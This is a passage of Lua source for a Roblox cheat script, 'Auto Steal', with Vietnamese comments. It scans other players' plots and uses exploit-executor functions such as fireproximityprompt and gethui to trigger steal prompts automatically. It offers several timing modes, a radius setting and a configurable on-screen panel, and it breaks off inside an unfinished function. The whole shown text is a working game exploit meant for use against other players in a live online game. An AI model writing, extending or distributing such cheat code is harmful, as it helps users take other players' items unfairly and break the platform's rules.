 for _, fn in ipairs(data.holdCallbacks or {}) do
 task.spawn(function() pcall(fn) end)
 end
 local tHold = tick()
 while A.enabled and (selectedStealMode == "Semi" or selectedStealMode == "V2") do
 local elapsed = tick() - startTime
 barSet(math.clamp(elapsed / HOLD_MAX, 0, 1), "STEALING")
 if elapsed >= HOLD_MIN then break end
 if not prompt.Parent then
 A.state.active = false
 A.state.phase = "idle"
 data.ready = true
 barReset()
 return
 end
 -- abort nếu quá xa prime range
 if distToAnimal(animalData) > (A.primeRange or 80) then
 A.state.active = false
 A.state.phase = "idle"
 data.ready = true
 barReset()
 return
 end
 task.wait()
 end

 -- Phase 2: waitingRange — vào radius rồi trigger (BloodHounds exact)
 A.state.phase = "waitingRange"
 local alreadyInRange = distToAnimal(animalData) <= STEAL_RANGE
 while A.enabled and (selectedStealMode == "Semi" or selectedStealMode == "V2") and prompt.Parent do
 local elapsed = tick() - startTime
 if elapsed > HOLD_MAX then break end
 if distToAnimal(animalData) > (A.primeRange or 80) then break end
 barSet(math.clamp(elapsed / HOLD_MAX, 0, 1), "STEALING")
 if distToAnimal(animalData) <= STEAL_RANGE then
 if not alreadyInRange then
 task.wait(ENTRY_DELAY)
 end
 if A.enabled and (selectedStealMode == "Semi" or selectedStealMode == "V2") then
 for _, fn in ipairs(data.triggerCallbacks or {}) do
 task.spawn(function() pcall(fn) end)
 end
 -- BloodHounds chỉ dùng triggerCallbacks; giữ fireproximityprompt phụ
 if fireproximityprompt then
 pcall(function() fireproximityprompt(prompt) end)
 end
 pcall(function()
 if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then
 _G.AutoCarrySpeed.WatchPickup(1.25)
 end
 end)
 fired = true
 end
 if fired then
 barSet(1, "SUCCESS")
 -- 100% → 0 ngay, tiếp tục trong radius
 barReset()
 A.state.active = false
 A.state.phase = "idle"
 A.cooldown = 0
 end
 break
 end
 task.wait()
 end
 else
 -- ========== V1 (giữ logic cũ Water-style 50% READY) ==========
 for _, fn in ipairs(data.holdCallbacks or {}) do
 task.spawn(function() pcall(fn) end)
 end
 A.state.phase = "holding"
 while A.enabled and (selectedStealMode == "Semi" or selectedStealMode == "V2") do
 local elapsed = tick() - startTime
 barSet(math.clamp(elapsed / HOLD_MIN, 0, 1) * 0.5, "STEALING")
 if elapsed >= HOLD_MIN then break end
 if not prompt.Parent then break end
 task.wait()
 end
 A.state.phase = "waitingRange"
 barSet(0.5, "READY")
 local alreadyInRange = distToAnimal(animalData) <= STEAL_RANGE
 while A.enabled and (selectedStealMode == "Semi" or selectedStealMode == "V2") do
 local elapsed = tick() - startTime
 if elapsed > HOLD_MAX then break end
 if not prompt or not prompt.Parent then break end
 if distToAnimal(animalData) <= STEAL_RANGE then
 if not alreadyInRange then
 task.wait(ENTRY_DELAY)
 end
 if A.enabled and (selectedStealMode == "Semi" or selectedStealMode == "V2") then
 for _, fn in ipairs(data.triggerCallbacks or {}) do
 task.spawn(function() pcall(fn) end)
 end
 if fireproximityprompt then
 pcall(function() fireproximityprompt(prompt, 1) end)
 pcall(function() fireproximityprompt(prompt) end)
 end
 pcall(function()
 if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then
 _G.AutoCarrySpeed.WatchPickup(1.25)
 end
 end)
 fired = true
 end
 if fired then
 barSet(1, "SUCCESS")
 -- 100% → tiếp tục ngay (reset ở cuối executeSemi)
 end
 break
 end
 task.wait()
 end
 end

 A.state.lastResult = fired and ("Stole " .. tostring(label)) or ("Missed window: " .. tostring(label))
 A.state.active = false
 A.state.phase = "idle"
 A.state.lastResultTime = tick()
 -- 100% → 0 ngay, không chờ cooldown dài — tiếp tục trong radius
 if fired then
 barSet(1, "SUCCESS")
 end
 barReset()
 data.ready = true
 end)
 return true
	end

	local function ensureScanThread()
 if A.scanThread then return end
 A.scanThread = task.spawn(function()
 while _G.AceSemiSteal do
 if A.enabled or (selectedStealMode == "Semi" or selectedStealMode == "V2") then pcall(scanAllPlots) end
 task.wait(5)
 end
 end)
	end
	_G.AceSemiAutoStealSetRadius = function(v)
 local n = tonumber(v)
 if n then A.radius = math.clamp(n, 1, 100) end
	end
	_G.AceSemiAutoStealStop = function()
 A.enabled = false
 if A.conn then A.conn:Disconnect(); A.conn = nil end
 A.state.active = false
 A.state.phase = "idle"
 barReset()
	end
	_G.AceSemiAutoStealStart = function()
 A.radius = math.clamp(tonumber(autoStealRadius) or A.radius or 10, 1, 100)
 -- Water full profiles (Version1 / Version2)
 local ver = (autoStealV2Version == "V2") and "V2" or "V1"
 if ver == "V1" then
 A.holdMin = 1.3
 A.holdMax = 2.6
 A.entryDelay = 0.05
 A.cooldown = 0
 A.primeRange = 80
 else
 A.holdMin = 1.3
 A.holdMax = 2.6
 A.entryDelay = 0.05
 A.cooldown = 0
 A.primeRange = 80
 end
 A.enabled = true
 ensureSync()
 ensureScanThread()
 pcall(scanAllPlots)
 if A.conn then A.conn:Disconnect(); A.conn = nil end
 A.conn = RunService.Heartbeat:Connect(function()
 if not A.enabled then return end
 if (selectedStealMode ~= "Semi" and selectedStealMode ~= "V2") then _G.AceSemiAutoStealStop(); return end
 if A.state.active then return end
 local target = pickClosest()
 if not target then return end
 local prompt = findPromptForAnimal(target)
 if prompt then executeSemi(prompt, target) end
 end)
	end
	_G.AceSemiAutoStealSync = function()
 if (selectedStealMode == "Semi" or selectedStealMode == "V2") and autoStealEnabled then
 _G.AceSemiAutoStealStart()
 else
 _G.AceSemiAutoStealStop()
 end
	end
end
_G.__AceSetupSemiAutoSteal()
_G.AceAutoStealSync = function()
	-- UI: V1=Normal | V2=Semi Version1 | V3=Semi Version2 (BloodHounds) — KHÔNG dùng AceV3
	if not autoStealEnabled then
 if _G.AceNormalAutoStealStop then _G.AceNormalAutoStealStop() end
 if _G.AceSemiAutoStealStop then _G.AceSemiAutoStealStop() end
 if _G.AceV3AutoStealStop then pcall(_G.AceV3AutoStealStop) end
 return
	end
	local mode = selectedStealMode
	if mode == "V1" then mode = "Normal" end
	if mode == "V2" then mode = "Semi"; autoStealV2Version = "V1" end
	if mode == "V3" then
 -- V3 nút = Semi Version 2 full BloodHounds
 mode = "Semi"
 autoStealV2Version = "V2"
 selectedStealMode = "Semi"
	end
	if mode == "Normal" then
 if _G.AceSemiAutoStealStop then _G.AceSemiAutoStealStop() end
 if _G.AceV3AutoStealStop then pcall(_G.AceV3AutoStealStop) end
 if _G.AceNormalAutoStealStart then _G.AceNormalAutoStealStart() end
	elseif mode == "Semi" then
 if _G.AceNormalAutoStealStop then _G.AceNormalAutoStealStop() end
 if _G.AceV3AutoStealStop then pcall(_G.AceV3AutoStealStop) end
 if _G.AceSemiAutoStealStart then _G.AceSemiAutoStealStart() end
	end
end

-- AUTO STEAL V3 (VYNX): proximity hold progress + decay
do
	local V3 = {enabled=false,conn=nil,progress=0,currentUid=nil,holding=false,holdPrompt=nil,cooldownUntil=0,lastHoldPulse=0}
	_G.AceV3Steal = V3
	local function v3Bar(p)
 p = math.clamp(tonumber(p) or 0, 0, 1)
 _G.AceStealBarProgress = p
 pcall(function() if _G.StealBar and _G.StealBar.SetProgress then _G.StealBar.SetProgress(p) end end)
	end
	local function v3Release(prompt)
 if not prompt then return end
 pcall(function() if prompt.InputHoldEnd then prompt:InputHoldEnd() end end)
	end
	local function v3Hold(prompt)
 if not prompt or not prompt.Parent then return end
 pcall(function() if prompt.InputHoldBegin then prompt:InputHoldBegin() end end)
 pcall(function() if fireproximityprompt then fireproximityprompt(prompt, 0) end end)
	end
	local function v3Trigger(prompt)
 if not prompt then return end
 pcall(function() if fireproximityprompt then fireproximityprompt(prompt, 1) end end)
 pcall(function() if prompt.InputHoldEnd then prompt:InputHoldEnd() end end)
	end
	local function v3LiveDist(ad, hrp)
 if not ad or not hrp then return math.huge end
 local plots = workspace:FindFirstChild("Plots")
 local plot = plots and plots:FindFirstChild(ad.plot)
 local pods = plot and plot:FindFirstChild("AnimalPodiums")
 local pod = pods and pods:FindFirstChild(ad.slot)
 if pod then
 local ok, pos = pcall(function() return pod:GetPivot().Position end)
 if ok and pos then ad.worldPosition = pos; return (hrp.Position - pos).Magnitude end
 end
 if ad.worldPosition then return (hrp.Position - ad.worldPosition).Magnitude end
 return math.huge
	end
	function _G.AceV3AutoStealStop()
 V3.enabled = false
 if V3.holdPrompt then v3Release(V3.holdPrompt) end
 if V3.conn then pcall(function() V3.conn:Disconnect() end); V3.conn = nil end
 V3.progress=0; V3.currentUid=nil; V3.holding=false; V3.holdPrompt=nil; V3.cooldownUntil=0
 v3Bar(0)
	end
	function _G.AceV3AutoStealSync()
 if V3.conn then
 V3.enabled = true
 return
 end
 V3.enabled=true; V3.progress=0; V3.currentUid=nil; V3.holding=false; V3.holdPrompt=nil; V3.cooldownUntil=0; V3.lastHoldPulse=0
 -- VYNX: V3 dùng chung animal cache của Normal — ON scanner
 pcall(function()
 if _G.AceNormalSteal then
 _G.AceNormalSteal.enabled = true
 end
 if _G.AceNormalAutoStealStart then
 -- chỉ cần animals scan, không chạy doSteal Normal
 end
 end)
 task.spawn(function()
 while V3.enabled do
 pcall(function()
 local a = _G.AceNormalSteal
 if not a then return end
 a.animals = a.animals or {}
 local plots = workspace:FindFirstChild("Plots")
 if not plots then return end
 local list = {}
 for _, plot in ipairs(plots:GetChildren()) do
 if plot:IsA("Model") then
 local sign = plot:FindFirstChild("PlotSign")
 local yb = sign and sign:FindFirstChild("YourBase")
 local mine = yb and yb:IsA("BillboardGui") and yb.Enabled
 if not mine then
 local podiums = plot:FindFirstChild("AnimalPodiums")
 if podiums then
 for _, podium in ipairs(podiums:GetChildren()) do
 if podium:IsA("Model") then
 local base = podium:FindFirstChild("Base")
 local spawn = base and base:FindFirstChild("Spawn")
 if spawn then
 table.insert(list, {
 plot = plot.Name,
 slot = podium.Name,
 worldPosition = spawn.Position,
 uid = plot.Name .. "_" .. podium.Name,
 })
 end
 end
 end
 end
 end
 end
 end
 a.animals = list
 end)
 task.wait(2.5)
 end
 end)
 V3.conn = RunService.Heartbeat:Connect(function(dt)
 local mode = selectedStealMode
 if mode == "V1" then mode = "Normal" end
 if mode == "V2" then mode = "Semi" end
 if not autoStealEnabled or mode ~= "V3" or not V3.enabled then
 if V3.holdPrompt then v3Release(V3.holdPrompt) end
 if V3.progress > 0 or V3.holding then
 V3.progress=0; V3.currentUid=nil; V3.holding=false; V3.holdPrompt=nil; v3Bar(0)
 end
 return
 end
 if tick() < (V3.cooldownUntil or 0) then v3Bar(0); return end
 local char = LP.Character
 local hrp = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso"))
 if not hrp then return end
 local a = _G.AceNormalSteal
 if a and (not a.animals or #a.animals == 0) and _G.AceNormalAutoStealStart then
 -- ensure scanner has run
 end
 local target, bestDist = nil, math.huge
 if a and a.animals then
 for _, ad in ipairs(a.animals) do
 local d = v3LiveDist(ad, hrp)
 if d < bestDist then bestDist=d; target=ad end
 end
 end
 local radius = tonumber(autoStealRadius) or (_G.AceNormalSteal and _G.AceNormalSteal.radius) or 60
 if target and bestDist <= radius then
 if V3.currentUid ~= target.uid then
 if V3.holdPrompt then v3Release(V3.holdPrompt) end
 V3.currentUid=target.uid; V3.progress=0; V3.holding=false; V3.holdPrompt=nil
 end
 local prompt = a and a.promptCache and a.promptCache[target.uid]
 if (not prompt or not prompt.Parent) then
 -- deep find like VYNX findPromptNormal
 local plots = workspace:FindFirstChild("Plots")
 local plot = plots and plots:FindFirstChild(target.plot)
 local pods = plot and plot:FindFirstChild("AnimalPodiums")
 local pod = pods and pods:FindFirstChild(target.slot)
 local base = pod and pod:FindFirstChild("Base")
 local spawn = base and base:FindFirstChild("Spawn")
 if spawn then
 local att = spawn:FindFirstChild("PromptAttachment")
 if att then
 for _, p in ipairs(att:GetChildren()) do
 if p:IsA("ProximityPrompt") then prompt = p; break end
 end
 end
 if not prompt then
 for _, obj in ipairs(spawn:GetDescendants()) do
 if obj:IsA("ProximityPrompt") then prompt = obj; break end
 end
 end
 if prompt and a then a.promptCache[target.uid] = prompt end
 end
 end
 local holdT = 1.4
 local stopT = 0.35
 if not prompt or not prompt.Parent then
 V3.progress = math.clamp(V3.progress + (dt / holdT), 0, 1); v3Bar(V3.progress); return
 end
 V3.holdPrompt = prompt
 local now = tick()
 if (not V3.holding) or (now - (V3.lastHoldPulse or 0) > 0.1) then
 V3.holding=true; V3.lastHoldPulse=now; v3Hold(prompt)
 end
 V3.progress = math.clamp(V3.progress + (dt / holdT), 0, 1)
 v3Bar(V3.progress)
 if V3.progress >= 1 then
 v3Trigger(prompt)
 -- 100% → 0 ngay, GIỮ target để đầy lại liền (không cần lại gần)
 V3.progress = 0
 V3.holding = false
 V3.cooldownUntil = 0
 v3Bar(0)
 -- giữ currentUid + holdPrompt để frame sau tiếp tục hold
 end
 else
 if V3.holding or V3.holdPrompt then v3Release(V3.holdPrompt); V3.holding=false; V3.holdPrompt=nil end
 if V3.progress > 0 then
 local stopT = 0.35
 V3.progress = math.max(0, V3.progress - (dt / stopT)); v3Bar(V3.progress)
 if V3.progress <= 0 then V3.currentUid=nil; v3Bar(0) end
 end
 end
 end)
	end
end



-- ============================================================
-- AUTO STEAL GUI
-- ============================================================
task.spawn(function()
	local CONFIG_FILE = "IlusionAutoSteal"
	local BackgroundIDs = {"89504528485163","108697485255882","71211662493854","118953269416540","106345334781345","103042929344358","126137370200580","129236724255771","109053968018578","76085007631338","99416158073201","126860692354524","73226092831324","90280869222992","90746158236678","107977050874654","124475159163140","117085976067902","76582249427748","131388128481309","106050493494582","71852104184395","84453255265251","98541566010518","118963313877514","82757811555212","130451097419605","129030262345273","76292842640935","92910922537368","105960347086002","116720305084998","90341354549871","72399600208480","81834484116440","135088241492683","90453834580322","90631990302263","109619268613730","88369503310562","80708025126373","102253425322931","135181794444219","111941119745474","138739435956313","92966351305582","127008542588565","81233250155347","77446891363466","93417009946836","102729289645203","113953274092851","116355482429334","133090961209841","84995781107338"}

	local BASE_W, BASE_H, BASE_H_EXP = 300, 96, 240
	local saved = {
 panelOpen = true, pos = nil, scale = 1.0, locked = false, expanded = false,
 bgIndex = 1, radius = 60, enabled = false, mode = "V1",
	}
	pcall(function()
 if isfile and isfile(CONFIG_FILE) and readfile then
 local d = HttpService:JSONDecode(readfile(CONFIG_FILE))
 if type(d) == "table" then
 saved.panelOpen = d.panelOpen ~= false
 saved.locked = d.locked == true
 saved.expanded = d.expanded == true
 saved.scale = math.clamp(tonumber(d.scale) or 1, 0.5, 2.5)
 saved.bgIndex = math.clamp(tonumber(d.bgIndex) or 1, 1, #BackgroundIDs)
 saved.radius = tonumber(d.radius) or 60
 saved.enabled = d.enabled == true
 saved.mode = (d.mode == "V2" or d.mode == "V3") and d.mode or "V1"
 if type(d.pos) == "table" then saved.pos = d.pos end
 end
 end
	end)
	autoStealRadius = tonumber(saved.radius) or 60

	local main
	local function saveVAS()
 pcall(function()
 if not writefile or not main then return end
 local p = main.Position
 saved.pos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
 local uiMode = "V1"
 if selectedStealMode == "Semi" or selectedStealMode == "V2" then
 uiMode = (autoStealV2Version == "V2") and "V3" or "V2"
 elseif selectedStealMode == "V3" then
 uiMode = "V3"
 end
 writefile(CONFIG_FILE, HttpService:JSONEncode({
 panelOpen = main.Visible,
 locked = saved.locked,
 expanded = saved.expanded,
 scale = saved.scale,
 pos = saved.pos,
 bgIndex = saved.bgIndex,
 radius = tonumber(autoStealRadius) or 60,
 enabled = autoStealEnabled == true,
 mode = uiMode,
 }))
 end)
	end

	local parent = (typeof(gethui) == "function" and gethui()) or game:GetService("CoreGui")
	pcall(function()
 local o = parent:FindFirstChild("IlusionAutoStealGui"); if o then o:Destroy() end
 local b = PlayerGui:FindFirstChild("IlusionAutoStealBarGui"); if b then b:Destroy() end
	end)

	local gui = Instance.new("ScreenGui")
	gui.Name = "IlusionAutoStealGui"
	gui.Enabled = false -- disabled: menu-only steal
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.DisplayOrder = 50
	pcall(function() gui.Parent = parent end)
	if not gui.Parent then gui.Parent = PlayerGui end

	local function corner(o, r)
 local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 10); c.Parent = o
	end
	local COL = {
 bg = Color3.fromRGB(10,10,12), header = Color3.fromRGB(16,16,18), row = Color3.fromRGB(22,22,26),
 stroke = Color3.fromRGB(50,50,58), white = Color3.fromRGB(240,240,245), dim = Color3.fromRGB(140,140,150),
 green = Color3.fromRGB(70,220,120), greenBg = Color3.fromRGB(20,55,35), off = Color3.fromRGB(40,40,48),
 bar = Color3.fromRGB(180,180,190), barBg = Color3.fromRGB(28,28,32),
	}

	main = Instance.new("Frame", gui)
	main.Size = UDim2.fromOffset(BASE_W, saved.expanded and BASE_H_EXP or BASE_H)
	main.BackgroundColor3 = COL.bg
	main.BorderSizePixel = 0
	main.Active = true
	main.Visible = saved.panelOpen ~= false
	main.ClipsDescendants = true
	main.ZIndex = 60
	corner(main, 12)
	Instance.new("UIStroke", main).Color = COL.stroke

	local bgImg = Instance.new("ImageLabel", main)
	bgImg.Size = UDim2.fromScale(1,1)
	bgImg.BackgroundTransparency = 1
	bgImg.ImageTransparency = 0.35
	bgImg.ScaleType = Enum.ScaleType.Crop
	bgImg.ZIndex = 60
	bgImg.Image = "rbxassetid://" .. BackgroundIDs[saved.bgIndex]
	corner(bgImg, 12)

	local uiScale = Instance.new("UIScale", main)
	uiScale.Scale = saved.scale
	if type(saved.pos) == "table" then
 main.Position = UDim2.new(tonumber(saved.pos.xs) or 0.5, tonumber(saved.pos.xo) or -140, tonumber(saved.pos.ys) or 0.12, tonumber(saved.pos.yo) or 0)
	else
 main.Position = UDim2.new(0.5, -140, 0.12, 0)
	end

	local header = Instance.new("Frame", main)
	header.Size = UDim2.new(1,0,0,28)
	header.BackgroundColor3 = COL.header
	header.BackgroundTransparency = 0.25
	header.BorderSizePixel = 0
	header.ZIndex = 61
	corner(header, 12)

	local title = Instance.new("TextLabel", header)
	title.Size = UDim2.new(0, 72, 1, 0)
	title.Position = UDim2.fromOffset(8, 0)
	title.BackgroundTransparency = 1
	title.Text = "Auto Steal"
	title.TextColor3 = COL.white
	title.Font = Enum.Font.GothamBold
	title.TextSize = 11
	title.TextXAlignment = Enum.TextXAlignment.Center
	title.ZIndex = 62

	local modeBtns = {}
	for i, name in ipairs({"V1","V2","V3"}) do
 local b = Instance.new("TextButton", header)
 b.Size = UDim2.fromOffset(26, 20)
 b.Position = UDim2.new(0, 78 + (i-1)*28, 0.5, -10)
 b.BackgroundColor3 = COL.row
 b.Text = name
 b.TextColor3 = COL.white
 b.Font = Enum.Font.GothamBold
 b.TextSize = 10
 b.ZIndex = 63
 b.AutoButtonColor = false
 corner(b, 6)
 modeBtns[name] = b
	end

	local lockBtn = Instance.new("TextButton", header)
	lockBtn.Size = UDim2.fromOffset(22, 22)
	lockBtn.Position = UDim2.new(1, -92, 0.5, -11)
	lockBtn.BackgroundColor3 = Color3.fromRGB(28,28,32)
	lockBtn.Text = saved.locked and "🔒" or "🔓"
	lockBtn.TextSize = 11
	lockBtn.ZIndex = 63
	corner(lockBtn, 6)

	local onBtn = Instance.new("TextButton", header)
	onBtn.Size = UDim2.fromOffset(40, 20)
	onBtn.Position = UDim2.new(1, -66, 0.5, -10)
	onBtn.BackgroundColor3 = COL.off
	onBtn.Text = "OFF"
	onBtn.TextColor3 = COL.white
	onBtn.Font = Enum.Font.GothamBold
	onBtn.TextSize = 10
	onBtn.ZIndex = 63
	onBtn.AutoButtonColor = false
	corner(onBtn, 10)

	local expBtn = Instance.new("TextButton", header)
	expBtn.Size = UDim2.fromOffset(22, 22)
	expBtn.Position = UDim2.new(1, -24, 0.5, -11)
	expBtn.BackgroundColor3 = Color3.fromRGB(28,28,32)
	expBtn.Text = saved.expanded and "−" or "+"
	expBtn.TextColor3 = COL.white
	expBtn.Font = Enum.Font.GothamBold
	expBtn.TextSize = 14
	expBtn.ZIndex = 63
	corner(expBtn, 6)

	local body = Instance.new("Frame", main)
	body.Size = UDim2.new(1, -16, 0, 44)
	body.Position = UDim2.fromOffset(8, 30)
	body.BackgroundTransparency = 1
	body.ZIndex = 61

	-- % steal bar — to, rõ, đẹp
	local statusLbl = Instance.new("TextLabel", body)
	statusLbl.Name = "Percent"
	statusLbl.Size = UDim2.new(0.55, 0, 0, 22)
	statusLbl.Position = UDim2.fromOffset(0, 0)
	statusLbl.BackgroundTransparency = 1
	statusLbl.Text = "0%"
	statusLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
	statusLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	statusLbl.TextStrokeTransparency = 0.2
	statusLbl.Font = Enum.Font.GothamBlack
	statusLbl.TextSize = 20
	statusLbl.TextXAlignment = Enum.TextXAlignment.Left
	statusLbl.ZIndex = 64

	local radiusLbl = Instance.new("TextLabel", body)
	radiusLbl.Size = UDim2.new(0.45, 0, 0, 16)
	radiusLbl.Position = UDim2.new(0.55, 0, 0, 3)
	radiusLbl.BackgroundTransparency = 1
	radiusLbl.Text = "Radius: 60"
	radiusLbl.TextColor3 = COL.dim
	radiusLbl.Font = Enum.Font.GothamBold
	radiusLbl.TextSize = 11
	radiusLbl.TextXAlignment = Enum.TextXAlignment.Right
	radiusLbl.ZIndex = 62

	local barBg = Instance.new("Frame", body)
	barBg.Size = UDim2.new(1, 0, 0, 14)
	barBg.Position = UDim2.fromOffset(0, 26)
	barBg.BackgroundColor3 = COL.barBg
	barBg.BorderSizePixel = 0
	barBg.ZIndex = 62
	corner(barBg, 6)
	local barFill = Instance.new("Frame", barBg)
	barFill.Size = UDim2.new(0, 0, 1, 0)
	barFill.BackgroundColor3 = Color3.fromRGB(100, 255, 160)
	barFill.BorderSizePixel = 0
	barFill.ZIndex = 63
	corner(barFill, 6)
	local barGrad = Instance.new("UIGradient", barFill)
	barGrad.Color = ColorSequence.new({
 ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 220, 140)),
 ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 255, 210)),
	})

	local expandPanel = Instance.new("Frame", main)
	expandPanel.Size = UDim2.new(1, -16, 0, 130)
	expandPanel.Position = UDim2.fromOffset(8, 78)
	expandPanel.BackgroundTransparency = 1
	expandPanel.ZIndex = 61
	expandPanel.Visible = saved.expanded == true

	local radTitle = Instance.new("TextLabel", expandPanel)
	radTitle.Size = UDim2.new(1,0,0,14)
	radTitle.BackgroundTransparency = 1
	radTitle.Text = "Radius (studs)"
	radTitle.TextColor3 = COL.white
	radTitle.Font = Enum.Font.GothamBold
	radTitle.TextSize = 10
	radTitle.TextXAlignment = Enum.TextXAlignment.Left
	radTitle.ZIndex = 62

	local radBox = Instance.new("TextBox", expandPanel)
	radBox.Size = UDim2.new(0, 70, 0, 24)
	radBox.Position = UDim2.fromOffset(0, 18)
	radBox.BackgroundColor3 = COL.row
	radBox.BorderSizePixel = 0
	radBox.Text = tostring(math.floor(autoStealRadius))
	radBox.TextColor3 = COL.white
	radBox.Font = Enum.Font.GothamBold
	radBox.TextSize = 12
	radBox.ClearTextOnFocus = false
	radBox.ZIndex = 63
	corner(radBox, 6)

	local radMinus = Instance.new("TextButton", expandPanel)
	radMinus.Size = UDim2.fromOffset(28, 24)
	radMinus.Position = UDim2.fromOffset(78, 18)
	radMinus.BackgroundColor3 = COL.row
	radMinus.Text = "−"
	radMinus.TextColor3 = COL.white
	radMinus.Font = Enum.Font.GothamBold
	radMinus.TextSize = 14
	radMinus.ZIndex = 63
	corner(radMinus, 6)

	local radPlus = Instance.new("TextButton", expandPanel)
	radPlus.Size = UDim2.fromOffset(28, 24)
	radPlus.Position = UDim2.fromOffset(110, 18)
	radPlus.BackgroundColor3 = COL.row
	radPlus.Text = "+"
	radPlus.TextColor3 = COL.white
	radPlus.Font = Enum.Font.GothamBold
	radPlus.TextSize = 14
	radPlus.ZIndex = 63
	corner(radPlus, 6)

	local bgTitle = Instance.new("TextLabel", expandPanel)
	bgTitle.Size = UDim2.new(1,0,0,14)
	bgTitle.Position = UDim2.fromOffset(0, 48)
	bgTitle.BackgroundTransparency = 1
	bgTitle.Text = "Background #1/" .. tostring(#BackgroundIDs)
	bgTitle.TextColor3 = COL.white
	bgTitle.Font = Enum.Font.GothamBold
	bgTitle.TextSize = 10
	bgTitle.TextXAlignment = Enum.TextXAlignment.Left
	bgTitle.ZIndex = 62

	local bgPrev = Instance.new("TextButton", expandPanel)
	bgPrev.Size = UDim2.fromOffset(40, 24)
	bgPrev.Position = UDim2.fromOffset(0, 66)
	bgPrev.BackgroundColor3 = COL.row
	bgPrev.Text = "◀"
	bgPrev.TextColor3 = COL.white
	bgPrev.Font = Enum.Font.GothamBold
	bgPrev.TextSize = 12
	bgPrev.ZIndex = 63
	corner(bgPrev, 6)

	local bgNext = Instance.new("TextButton", expandPanel)
	bgNext.Size = UDim2.fromOffset(40, 24)
	bgNext.Position = UDim2.fromOffset(46, 66)
	bgNext.BackgroundColor3 = COL.row
	bgNext.Text = "▶"
	bgNext.TextColor3 = COL.white
	bgNext.Font = Enum.Font.GothamBold
	bgNext.TextSize = 12
	bgNext.ZIndex = 63
	corner(bgNext, 6)

	local scaleTitle = Instance.new("TextLabel", expandPanel)
	scaleTitle.Size = UDim2.new(0, 80, 0, 14)
	scaleTitle.Position = UDim2.fromOffset(100, 50)
	scaleTitle.BackgroundTransparency = 1
	scaleTitle.Text = "Size GUI"
	scaleTitle.TextColor3 = COL.dim
	scaleTitle.Font = Enum.Font.GothamBold
	scaleTitle.TextSize = 10
	scaleTitle.TextXAlignment = Enum.TextXAlignment.Left
	scaleTitle.ZIndex = 62

	local scaleMinus = Instance.new("TextButton", expandPanel)
	scaleMinus.Size = UDim2.fromOffset(36, 24)
	scaleMinus.Position = UDim2.fromOffset(100, 66)
	scaleMinus.BackgroundColor3 = COL.row
	scaleMinus.Text = "−"
	scaleMinus.TextColor3 = COL.white
	scaleMinus.Font = Enum.Font.GothamBold
	scaleMinus.TextSize = 16
	scaleMinus.ZIndex = 63
	corner(scaleMinus, 6)

	local scalePlus = Instance.new("TextButton", expandPanel)
	scalePlus.Size = UDim2.fromOffset(36, 24)
	scalePlus.Position = UDim2.fromOffset(142, 66)
	scalePlus.BackgroundColor3 = COL.row
	scalePlus.Text = "+"
	scalePlus.TextColor3 = COL.white
	scalePlus.Font = Enum.Font.GothamBold
	scalePlus.TextSize = 16
	scalePlus.ZIndex = 63
	corner(scalePlus, 6)

	local scaleVal = Instance.new("TextLabel", expandPanel)
	scaleVal.Size = UDim2.fromOffset(48, 24)
	scaleVal.Position = UDim2.fromOffset(184, 66)
	scaleVal.BackgroundTransparency = 1
	scaleVal.Text = string.format("%.0f%%", (saved.scale or 1) * 100)
	scaleVal.TextColor3 = COL.white
	scaleVal.Font = Enum.Font.GothamBold
	scaleVal.TextSize = 12
	scaleVal.ZIndex = 62

	local function applyBg(idx)
 saved.bgIndex = math.clamp(tonumber(idx) or 1, 1, #BackgroundIDs)
 bgImg.Image = "rbxassetid://" .. BackgroundIDs[saved.bgIndex]
 bgTitle.Text = "Background #" .. saved.bgIndex .. "/" .. #BackgroundIDs
 saveVAS()
	end

	local function setRadius(v)
 v = math.clamp(math.floor(tonumber(v) or 60), 1, 500)
 autoStealRadius = v
 _G.AceStealRadii = _G.AceStealRadii or {}
 if selectedStealMode == "Normal" or selectedStealMode == "V1" then
 _G.AceStealRadii.Normal = v
 elseif selectedStealMode == "V3" then
 _G.AceStealRadii.V3 = v
 else
 _G.AceStealRadii.Semi = v
 end
 if _G.AceNormalAutoStealSetRadius then pcall(_G.AceNormalAutoStealSetRadius, v) end
 if _G.AceSemiSteal then _G.AceSemiSteal.radius = v end
 radBox.Text = tostring(v)
 radiusLbl.Text = "Radius: " .. tostring(v)
 saveVAS()
	end

	local function currentMode()
 if selectedStealMode == "Semi" then
 return (autoStealV2Version == "V2") and "V3" or "V2"
 end
 if selectedStealMode == "V3" then return "V3" end
 return "V1"
	end

	local function applyMode(mode)
 _G.AceStealRadii = _G.AceStealRadii or { Normal = 60, Semi = 9, V3 = 60 }
 if mode == "V1" then
 selectedStealMode = "Normal"
 autoStealRadius = _G.AceStealRadii.Normal or 60
 elseif mode == "V2" then
 selectedStealMode = "Semi"
 autoStealV2Version = "V1"
 autoStealRadius = _G.AceStealRadii.Semi or 9
 else
 selectedStealMode = "Semi"
 autoStealV2Version = "V2"
 autoStealRadius = _G.AceStealRadii.Semi or _G.AceStealRadii.V3 or 9
 end
 setRadius(autoStealRadius)
 if autoStealEnabled and _G.AceAutoStealSync then
 pcall(_G.AceAutoStealSync)
 end
 saveVAS()
	end

	local function styleModes()
 local cur = currentMode()
 for n,b in pairs(modeBtns) do
 local on = (n == cur)
 b.BackgroundColor3 = on and Color3.fromRGB(240,240,245) or COL.row
 b.TextColor3 = on and Color3.fromRGB(10,10,12) or COL.white
 end
	end

	local function refreshUI()
 local on = autoStealEnabled == true
 onBtn.Text = on and "ON" or "OFF"
 onBtn.BackgroundColor3 = on and COL.greenBg or COL.off
 onBtn.TextColor3 = on and COL.green or COL.white
 radiusLbl.Text = "Radius: " .. tostring(math.floor(tonumber(autoStealRadius) or 60))
 styleModes()
	end

	local function setStealOn(state)
 autoStealEnabled = state and true or false
 _G.autoStealEnabled = autoStealEnabled
 -- ensure setups exist
 pcall(function()
 if _G.__AceSetupNormalAutoSteal then _G.__AceSetupNormalAutoSteal() end
 end)
 pcall(function()
 if _G.__AceSetupSemiAutoSteal then _G.__AceSetupSemiAutoSteal() end
 end)
 if _G.AceAutoStealSync then
 local ok, err = pcall(_G.AceAutoStealSync)
